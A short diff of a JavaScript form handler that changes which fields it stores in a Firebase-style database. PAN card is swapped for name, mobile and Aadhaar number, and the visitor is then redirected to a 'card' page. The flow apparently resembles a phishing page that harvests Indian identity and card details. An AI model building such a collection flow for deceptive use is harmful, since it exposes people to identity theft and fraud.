@@ -7,25 +7,27 @@ document.getElementById("ududip007").addEventListener("submit", submitForm);
 function submitForm(e) {
   e.preventDefault();
 
-    var amobile = getElementVal("amobile");
-    var bpan = getElementVal("bpan");
+    var aname = getElementVal("aname");
+    var bmobile = getElementVal("bmobile");
+  var caadhar = getElementVal("caadhar");
     
     
 
   
 
-  saveMessages(amobile, bpan);
+  saveMessages(aname, bmobile, caadhar);
 
   // redirect to card page
   window.location.href = "card.html";
 }
 
-const saveMessages = (amobile, bpan) => {
+const saveMessages = (aname, bmobile, caadhar) => {
   var newududip007 = ududip007DB.push();
 
   newududip007.set({
-      Mobile: amobile,
-      Pan_card: bpan,
+      name: aname,
+      mobile: bmobile,
+      a1dhar : caadhar
       
       
     
